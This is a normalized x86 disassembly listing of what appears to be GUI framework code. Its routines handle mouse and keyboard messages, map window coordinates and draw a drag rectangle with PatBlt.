mov eax [ rw-data ]
call sub_448d80
mov eax edi
call sub_43d434
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x8f ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dc70
call sub_4047d8
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0xc ]
mov edx esp
mov eax edi
call sub_43bc78
mov eax [ esp + 0xc ]
mov [ esp ] eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x4 ] eax
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_43d400
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_43a108
sub_43c980
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xe2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
movzx ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_43c9bc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xda ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xdc ]
call [ ebx + 0xd8 ]
sub_43ca08
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_43ca34
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_43c0e8
mov edi eax
mov eax [ ebx + 0x40 ]
call sub_43c0d4
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x30 ]
fild [ ebx + 0x14 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x4c ]
fld [ esp ]
call sub_403260
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_403260
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x4c ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x1db ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x8 ]
call sub_443be8
push eax
call GetWindowRect
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
movzx edx [ ebx + 0x5c ]
push edx
lea edx [ ebx + 0x4c ]
push edx
mov eax [ eax + 0x1b0 ]
mov ecx [ ebx + 0x60 ]
mov edx [ ebx + 0x40 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_43cb20
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xfa ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
sub_43cb6c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov edi [ ebx + 0x8 ]
mov eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
push eax
movzx ecx [ edi + 0xd ]
movzx edx [ edi + 0xc ]
mov eax ebp
mov si 0xffd5
call sub_404160
and eax 0x7f
mov [ ebx + 0xc ] eax
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43cba0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov edi eax
mov [ ebp - 0xa ] 0x0
cmp [ edi + 0x142 ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push ebx
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
movzx ecx [ ebp - 0x1 ]
mov edx edi
mov eax [ edi + 0x144 ]
call [ edi + 0x140 ]
movzx eax [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ edi + 0x98 ] ebx
jmp r-xdata
mov eax [ edi + 0x98 ]
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
cmp [ edi + 0x98 ] 0x0
setl bl
mov eax [ edi + 0x98 ]
cdq
xor eax edx
sub eax edx
sub eax 0x78
mov [ edi + 0x98 ] eax
test bl bl
je r-xdata
lea ecx [ ebp - 0x9 ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe0
call sub_404160
mov [ ebp - 0xa ] al
cmp [ edi + 0x98 ] 0x0
je r-xdata
lea ecx [ ebp - 0x9 ]
movzx edx [ ebp - 0x1 ]
mov eax edi
mov si 0xffe1
call sub_404160
mov [ ebp - 0xa ] al
jmp r-xdata
mov eax [ edi + 0x98 ]
neg eax
mov [ edi + 0x98 ] eax
sub_43cc74
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
movzx eax [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_43ccc0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x152 ] 0x0
je r-xdata
movzx eax [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
movzx ecx [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x154 ]
call [ ebx + 0x150 ]
sub_43cd0c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x4c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x64
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43ce27
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x48 ]
call sub_423efc
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43ce2e
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_43ce58
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebp edx
mov [ esp ] eax
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx edi
mov eax [ esp ]
call sub_43bc78
movzx eax [ ebp + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_404114
mov esi [ eax + 0x40 ]
mov eax [ esp + 0x9 ]
push eax
movzx eax [ ebp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_404160
mov eax [ esp + 0x9 ]
push eax
movzx eax [ ebp + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ edi + 0xc ]
mov si 0xffc3
call sub_404160
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
movzx eax [ esp + 0x4 ]
mov [ ebp + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_404160
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ edi + 0xc ]
mov si 0xffb5
call sub_404160
jmp r-xdata
sub_43cf48
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0x94 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_415348
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax ebx
call sub_43d434
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax ebx
call sub_43c0d4
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_43c0e8
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_415398
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43d128
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_43bbc8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x94 ]
mov ecx ebx
mov edx edi
mov si 0xffbd
call sub_404160
test al al
jne r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x1b0 ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x94 ]
call sub_443be8
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4394ac
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_43d114
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0x94 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_443be8
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x8 ] edi
mov eax [ ebp - 0xc ]
movzx edx [ ebp + 0x8 ]
mov [ eax + 0x5c ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x60 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x4c ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_443be8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb5
call sub_404160
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403f64
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43ba58
test esi esi
je r-xdata
sub_43d128
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0x94 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbd
call sub_404160
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_43e50c
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_404160
mov eax esi
call sub_43baf8
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_43bab4
mov ecx eax
xor edx edx
xor eax eax
call sub_415370
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_404160
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_43d1d0
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xb2 ] 0x0
je r-xdata
movzx eax [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xb4 ]
call [ ebx + 0xb0 ]
sub_43d200
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
movzx edx [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_43d26c
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_43d32c
sub_43d29c
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xba ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xbc ]
call [ ebx + 0xb8 ]
sub_43d2cc
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_43bc78
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_43d2f8
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_43d32c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov edi [ eax ]
call [ edi + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ ebx ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ ebx ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ esi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ esi ] eax
sub_43d400
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_43d434
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0x94 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa0 ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0x9c ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x90 ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xa8 ] eax
jmp r-xdata
mov eax [ ebx + 0x94 ]
movzx eax [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x90 ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa4 ] eax
mov eax [ ebx + 0x94 ]
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_43d4a8
push ebx
mov ebx eax
mov eax [ edx ]
mov [ ebx + 0x40 ] eax
mov eax [ edx + 0x4 ]
mov [ ebx + 0x44 ] eax
mov eax [ edx + 0x8 ]
sub eax [ edx ]
mov [ ebx + 0x48 ] eax
mov eax [ edx + 0xc ]
sub eax [ edx + 0x4 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_43b644
mov eax ebx
call sub_43ecbc
pop ebx
retn
sub_43d4dc
push ebp
mov ebp esp
add esp 0xfffffee8
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
xor edx edx
mov eax esi
call sub_44e778
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x109
ja r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x298 ] 0x0
je r-xdata
cmp eax 0xb00b
jne r-xdata
cmp eax 0x20a
ja r-xdata
mov dl 0x1
mov eax esi
call sub_44e778
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x298 ]
mov edx esi
mov edi [ eax ]
call [ edi + 0x24 ]
test al al
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_43bcd4
test [ esi + 0x50 ] 0x80
jne r-xdata
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x14 ]
mov edi [ eax ]
call [ edi + 0x100 ]
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
add eax 0xfffffe00
cmp eax 0x7
ja r-xdata
sub eax 0x203
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
jmp [ eax * 4 + jump_table_43d5b5 ]
sub [ ebx ] 0x2
sub eax 0x3
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov ecx ebx
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_459524
jmp r-xdata
test [ esi + 0x52 ] 0x8
je r-xdata
cmp [ esi + 0x5d ] 0x1
jne r-xdata
and [ esi + 0x54 ] 0xfffe
jmp r-xdata
sub eax 0x3
jne r-xdata
mov eax [ ebx ]
mov edx [ rw-data ]
cmp eax [ edx + 0x1c ]
jne r-xdata
movzx eax [ r-xdata ]
and ax [ esi + 0x54 ]
movzx edx [ r-xdata ]
cmp dx ax
jne r-xdata
or [ esi + 0x54 ] 0x1
jmp r-xdata
mov eax esi
mov si 0xffed
call sub_404160
jmp r-xdata
lea eax [ ebp - 0x115 ]
push eax
call GetKeyboardState
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x115 ]
call sub_44e678
mov [ ebp - 0xc ] al
movzx eax [ ebx + 0x4 ]
mov [ ebp - 0xa ] ax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax esi
mov si 0xffc9
call sub_404160
jmp r-xdata
mov eax [ rw-data ]
call sub_448cb4
test al al
jne r-xdata
mov eax [ rw-data ]
call sub_448c40
mov [ ebp - 0x15 ] 0x0
mov eax [ rw-data ]
mov edi [ eax + 0x28 ]
test edi edi
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x28 ] 0x0
je r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45967c
jmp r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov eax esi
call sub_443be8
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_448d80
jmp r-xdata
xor edx edx
mov eax esi
call sub_44e778
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ esi + 0x30 ]
call sub_443be8
mov edx eax
mov eax edi
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_443be8
mov edx eax
mov eax [ rw-data ]
mov eax [ eax + 0x28 ]
mov ecx esi
mov edi [ eax ]
call [ edi + 0xe0 ]
mov [ ebp - 0x15 ] al
sub_43d7ac
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax [ ebx ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x8 ]
call sub_40a550
mov edi eax
mov eax [ esi + 0x64 ]
call sub_40a57c
mov [ esi + 0x64 ] edi
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax esi
call sub_43bcd4
dec eax
je r-xdata
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov edi r-xdata
mov edi eax
jmp r-xdata
mov edi [ esi + 0x64 ]
test edi edi
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ ebx + 0x4 ]
dec ecx
mov eax [ ebx + 0x8 ]
mov edx edi
call sub_40a37c
call sub_40a308
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_40a308
mov [ ebx + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
jmp r-xdata
sub_43d854
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx eax [ eax + 0x5e ]
pop ebp
retn
mov edx [ ebp + 0x8 ]
movzx eax [ eax + 0x5e ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp al [ edx + 0x5e ]
setne al
pop ebp
retn
sub_43d888
push ebp
mov ebp esp
push ebx
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x180 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x180 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
dec al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebx + 0x184 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
cmp eax [ edx + 0x184 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
